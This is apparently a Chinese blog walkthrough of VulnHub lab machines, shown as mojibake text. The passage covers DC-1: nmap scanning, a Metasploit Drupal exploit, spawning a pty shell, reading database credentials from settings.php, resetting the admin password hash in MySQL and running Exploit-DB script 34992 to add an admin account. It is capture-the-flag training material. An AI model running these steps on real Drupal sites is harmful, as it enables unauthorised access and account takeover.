<li><a href="#2%E5%90%8E%E5%8F%B0%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC">2.åå°æ·»åŠ æœ¨é©¬</a></li>
<li><a href="#3%E5%8F%8D%E5%BC%B9shell">3.åå¼¹shell</a></li>
<li><a href="#4%E6%8F%90%E6%9D%83exim4">4.ææƒã€exim4ã€‘</a><ul>
<li><a href="#%E6%84%8F%E5%A4%96">æ„å¤–</a></li>
<li><a href="#ps-setuid">p.s. setuid</a><ul>
<li><a href="#%E5%9C%A8pwn%E4%B8%AD">åœ¨pwnä¸­</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%B9%9D-dc9%E4%B8%AD%E7%BA%A7">ä¹ã€DC9[ä¸­çº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-8">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#1sql%E6%B3%A8%E5%85%A5-1">1.sqlæ³¨å…¥</a></li>
<li><a href="#2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">2.æ–‡ä»¶åŒ…å«</a></li>
<li><a href="#3ssh">3.ssh</a><ul>
<li><a href="#1-knockd">1ï¼‰ knockd</a></li>
<li><a href="#2-hydra">2ï¼‰ hydra</a></li>
</ul>
</li>
<li><a href="#4%E6%8F%90%E6%9D%83">4.ææƒ</a><ul>
<li><a href="#py%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8">pyè„šæœ¬åˆ©ç”¨</a><ul>
<li><a href="#openssl%E5%8A%A0%E7%9B%90"><code>openssl</code>åŠ ç›</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#else">ELSE</a></li>
<li><a href="#%E4%B8%80-deathnote-1%E5%88%9D%E7%BA%A7">ä¸€ã€DEATHNOTE: 1[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-9">ä¿¡æ¯æ”¶é›†</a><ul>
<li><a href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF">*å…³é”®ä¿¡æ¯</a></li>
</ul>
</li>
<li><a href="#1wpscan">1.wpscan</a><ul>
<li><a href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0">ç™»å½•åå°</a></li>
</ul>
</li>
<li><a href="#2ssh%E7%99%BB%E5%BD%95-1">2.sshç™»å½•</a></li>
<li><a href="#3%E7%99%BB%E5%BD%95kira">3.ç™»å½•kira</a></li>
<li><a href="#4%E6%8F%90%E6%9D%83-1">4.ææƒ</a></li>
<li><a href="#ps%E9%9D%B6%E6%9C%BA%E5%BD%A9%E8%9B%8B">p.s.é¶æœºå½©è›‹</a></li>
</ul>
</li>
<li><a href="#%E4%BA%8C-matrix-breakout2-morpheus%E4%B8%AD%E7%BA%A7">äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-10">ä¿¡æ¯æ”¶é›†</a><ul>
<li><a href="#dirbuster">dirbuster</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h1><span id="å‰è¨€">å‰è¨€</span></h1><p>å®˜ç½‘ä¸‹è½½åœ°å€</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p>
</blockquote>
<p>è¿™é‡Œæä¸€ä¸‹é¶åœºæœº<code>ip</code>æ€ä¹ˆçœ‹</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p>
<blockquote>
<p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134æ˜¯è™šæ‹Ÿæœºip</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
<p>æ‰¾åˆ°é¶æœº<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>ä¹ æƒ¯æ€§ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹å®ƒç«¯å£</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
<hr>
<h1><span id="dcç³»åˆ—1~9å®Œ">DCç³»åˆ—ã€1~9ã€‘(å®Œ)</span></h1><h1><span id="ä¸€-dc-1åˆçº§">ä¸€ã€DC-1[åˆçº§]</span></h1><p><strong>five flags</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>æµè§ˆå™¨è®¿é—®é¶æœº<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¼€å§‹ç•Œé¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ’ä»¶<code>Wappalyzer</code>ï¼Œå®ƒèƒ½å¤Ÿè·å–ç½‘é¡µè‡ªèº«çš„æ¡†æ¶å’Œç¼–å†™çš„è¯­è¨€ï¼Œè¿™æ ·å°±ä¸ç”¨æŸ¥çœ‹ç½‘ç»œè¿”å›åŒ…æ¥åˆ†æäº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p>
<p>å¯ä»¥çœ‹åˆ°ç½‘ç«™æ˜¯ç”¨<code>php</code>è¯­è¨€ç¼–å†™çš„ï¼Œ<code>CMS</code>æ˜¯<code>Drupal</code></p>
<hr>
<h2><span id="flag1">Flag1</span></h2><h3><span id="msf">msf</span></h3><p>å…ˆç”¨<code>msf</code>çœ‹çœ‹æœ‰æ²¡æœ‰<code>drupal</code>ç›¸åº”çš„æ”»å‡»è„šæœ¬</p>
<blockquote>
<p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥<code>msf</code>ç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p>
<blockquote>
<p>è¾“å…¥<code>search drupal</code>ï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬<br><em>å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢</em></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p>
<blockquote>
<p>è¾“å…¥<code>use 1</code>ï¼Œè¿›å…¥ç¼–å·1è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p>
<blockquote>
<p>è¾“å…¥<code>show options</code>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p>
<blockquote>
<p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œ<code>yes</code>æ˜¯å¿…å¡«é¡¹ï¼Œ<code>no</code>æ˜¯éå¿…å¡«é¡¹</p>
</blockquote>
<p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p>
<blockquote>
<p>è¾“å…¥<code>set RHOSTS 192.168.133.136</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p>
<blockquote>
<p>å†è¾“å…¥<code>run</code>ï¼Œè¿è¡Œè„šæœ¬</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p>
<blockquote>
<p>è¾“å…¥<code>shell</code>ï¼Œè¿›å…¥<code>shell</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p>
<blockquote>
<p>è¾“å…¥<code>whoami</code>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p>
<blockquote>
<p>è¾“å…¥<code>ls</code>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p>
<h3><span id="äº¤äº’å¼shell"><code>*äº¤äº’å¼shell</code></span></h3><p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>å‘ç°<code>flag1.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat flag1.txt</code>æŸ¥çœ‹</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p>
<blockquote>
<p><code>Every good CMS needs a config file - and so do you.</code><br>æ„æ€æ˜¯ï¼šä¸€ä¸ªå¥½çš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰éœ€è¦ä¸€ä¸ªconfig fileï¼ˆé…ç½®æ–‡ä»¶ï¼‰</p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çœ‹çœ‹å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯Flag2çš„çº¿ç´¢</p>
</blockquote>
<h2><span id="flag2">Flag2</span></h2><p>åœ¨ç›®å½•ä¸‹æˆ‘ä»¬å‘ç°æœ‰ä¸ª<code>sites</code>ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç«™ç‚¹ç›®å½•ï¼Œé‡Œé¢å¾ˆæœ‰å¯èƒ½æœ‰é…ç½®æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<blockquote>
<p>è¾“å…¥<code>cd sites;ls -a</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p>
<p>æœ‰ä¸ª<code>default</code>ï¼ˆé»˜è®¤ï¼‰ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>cd default;ls -a</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p>
<p>çœ‹åˆ°<code>setting.php</code>ä¹Ÿå°±å·®ä¸å¤šæ˜¯<code>config file</code></p>
<blockquote>
<p>è¾“å…¥<code>cat setting.php</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p>
<p>å¾—åˆ°<code>Flag2</code></p>
<blockquote>
<ul>
<li><p><code>flag2</code></p>
</li>
<li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p>
</li>
<li><p><code>only ways to gain access (and you WILL need access).</code></p>
</li>
<li><p><code>What can you do with these credentials?</code></p>
<p> æ„æ€æ˜¯ï¼šæš´åŠ›å’Œå­—å…¸æ”»å‡»ä¸æ˜¯è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆæ‚¨å°†éœ€è¦è®¿é—®æƒé™ï¼‰ã€‚<br> ä½ èƒ½ç”¨è¿™äº›è¯ä¹¦åšä»€ä¹ˆï¼Ÿ</p>
</li>
</ul>
<p>å°±æ˜¯è¯´ä¸è¦å±€é™äºçˆ†ç ´å¯†ç æ¥ç™»å½•adminç”¨æˆ·ï¼Œä½ æ‹¥æœ‰äº†æ•°æ®åº“è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥åšä»€ä¹ˆ</p>
</blockquote>
<hr>
<h2><span id="flag3">Flag3</span></h2><p>å…³é”®åˆ†æè¿™é‡Œï¼Œè¿™æ˜¯é¶æœºæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç çš„ä¿¡æ¯ï¼Œ</p>
<p>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥é¶æœºçš„æ•°æ®åº“ï¼Œå¯¹é‡Œé¢çš„æ•°æ®åº“è¿›è¡Œä¿®æ”¹æˆ–å¢æ·»</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>

<h3><span id="1mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç æˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ">1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</span></h3><blockquote>
<p>è¾“å…¥<code>mysql -udbuser -pR0ck3t</code></p>
<p>*æ³¨æ„è¿™é‡Œ-uå’Œ-påé¢æ²¡æœ‰ç©ºæ ¼ï¼Œæœ‰ç©ºæ ¼ä¼šæŠ¥é”™</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p>
<p>å…ˆçœ‹çœ‹æ•°æ®åº“</p>
<blockquote>
<p>è¾“å…¥<code>show databases;</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p>
<p>æŸ¥çœ‹<code>drupaldb</code>åº“é‡Œçš„è¡¨</p>
<blockquote>
<p>è¾“å…¥<code>use drupaldb;</code><br>ç„¶åè¾“å…¥<code>show tables;</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p>
<p>çœ‹åˆ°<code>users</code>è¡¨ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ç™»å½•æˆåŠŸçš„å…³é”®ï¼ŒæŸ¥çœ‹è¯¥è¡¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿®æ”¹æˆ–è€…è·å¾—adminç”¨æˆ·çš„å¯†ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯éƒ½éœ€è¦åŠ å¯†</p>
<blockquote>
<p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°ç”¨æˆ·çš„å¯†ç æ˜¯è¢«åŠ å¯†äº†çš„ï¼Œé‚£åŠ å¯†æ–‡ä»¶è‚¯å®šæ˜¯åœ¨è„šæœ¬ç›®å½•é‡Œï¼Œä¹Ÿå°±æ˜¯scriptsç›®å½•é‡Œï¼Œåˆ©ç”¨åŠ å¯†è„šæœ¬ï¼ŒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œç„¶åæ›´æ–°æ•°æ®åº“é‡Œadminç”¨æˆ·åŸæœ¬çš„å¯†ç </p>
</blockquote>
<p>æˆ‘ä»¬æ¥æ‰¾æ‰¾å¯†ç åŠ å¯†è„šæœ¬åœ¨å“ªé‡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>çœ‹åˆ°<code>scripts</code>ç›®å½•</p>
<p>è¿›å…¥æŸ¥çœ‹</p>
<blockquote>
<p>è¾“å…¥<code>cd scripts;ls -a</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>password-hash.sh</code>æ–‡ä»¶ï¼Œå¯†ç å°±æ˜¯é€šè¿‡å®ƒè¿›è¡ŒhashåŠ å¯†çš„</p>
<p>è¿è¡Œå®ƒï¼Œè®©å®ƒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†</p>
<blockquote>
<p>è¾“å…¥<code>./password-hash.sh  123456</code></p>
</blockquote>
<hr>
<p>ä½†æ˜¯è¿è¡Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰è¯·å¿½ç•¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p>
<p>æŠ¥é”™è¯´</p>
<blockquote>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯æ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°ï¼Œincludesç›®å½•ç¡®å®ä¹Ÿä¸åœ¨scriptsç›®å½•ä¸‹ï¼Œäºæ˜¯ç”¨cpæŠŠ<code>includes</code>ç›®å½•æ”¾åˆ°<code>scripts</code>ç›®å½•ä¸‹å³å¯</p>
<blockquote>
<p>è¾“å…¥<code>cp -r ../includes ./</code></p>
</blockquote>
<hr>
<p>å¾—åˆ°åŠ å¯†æ•°æ®</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830153417077.png" alt="image-20220830153417077"></p>
<p>å†æ¬¡è¿›å…¥<code>mysql</code>æ•°æ®åº“ï¼Œä¿®æ”¹ <code>admin</code>å¯†ç </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update<span class="built_in"> users </span><span class="built_in">set</span> <span class="attribute">pass</span>=<span class="string">&quot;<span class="variable">$S</span><span class="variable">$D9wpmqJmKcXIUSGVEY2utFL8LBiwX18pbpLhBZifD9gXThGAwz4x</span>&quot;</span> where <span class="attribute">name</span>=<span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830161703412.png" alt="image-20220830161703412"></p>
<p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½ç™»å½•</p>
<blockquote>
<p>ç”¨æˆ·åï¼š<code>admin</code></p>
<p>å¯†ç ï¼š<code>123456</code></p>
</blockquote>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830161808584.png" alt="image-20220830161808584"></p>
<p>å¾—åˆ°flag3</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830161837967.png" alt="image-20220830161837967"></p>
<h3><span id="2åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·">2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</span></h3><p>ä¼˜ç‚¹æ˜¯æ›´åŠ æ–¹ä¾¿ï¼Œå¿«æ·ï¼Œ<strong>ä½†æ˜¯è„šæœ¬ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œåªæœ‰è‡ªå·±æ˜ç™½åŸç†æ‰æ˜¯çœŸæ­£æŒæ¡</strong>ï¼Œè¿™ä¸ªçš„æœ¬è´¨ä¹Ÿæ˜¯åˆ©ç”¨<code>sql</code>æ³¨å…¥</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.exploit-db.com<span class="regexp">/exploits/</span><span class="number">34992</span></span><br></pre></td></tr></table></figure>

<p>è¯¥ç½‘ç«™åœ¨kalié‡Œé¢æµè§ˆå™¨ä¹¦ç­¾è‡ªå¸¦çš„ï¼Œè¿™ä¸ªè„šæœ¬é€‚ç”¨äºdrupalï¼Œç›´æ¥ä¸‹è½½ä¸‹æ¥ç”¨å³å¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830145453216.png" alt="image-20220830145453216"></p>
<p>ä¸‹è½½å¥½åï¼Œè¿è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python2</span> <span class="number">34992</span>.py -t http://<span class="number">192.168.133.136</span> -u admin001 -p <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>-tå°±æ˜¯ç›®æ ‡ç½‘ç«™ï¼Œ-uå°±æ˜¯æ–°å»ºçš„ç”¨æˆ·åï¼Œ-på°±æ˜¯ç”¨æˆ·åå¯†ç <br>*æ³¨æ„è¿™ä¸ªè„šæœ¬éœ€è¦ python2è¿è¡Œï¼Œpython3è¯­æ³•ä¸ç¬¦åˆ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830145642143.png" alt="image-20220830145642143"></p>
<p>ç„¶åæŒ‰ç…§è¾“å…¥çš„ï¼Œç›´æ¥ç™»å½•å°±å¯ä»¥äº†ï¼Œæˆ–è€…ç›´æ¥ç‚¹å‡»ä¸‹é¢é“¾æ¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830153620620.png" alt="image-20220830153620620"></p>
<p>å°±å¯ä»¥æ‹¿åˆ°<code>Flag3</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220830154431807.png" alt="image-20220830154431807"></p>
<hr>
<h2><span id="flag4">Flag4</span></h2><h3><span id="1ä¸ªäººæ–¹æ³•">1ï¼‰ä¸ªäººæ–¹æ³•</span></h3><p>åˆ†æä¸€ä¸‹<code>flag3</code></p>
<blockquote>
<p><code>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</code></p>
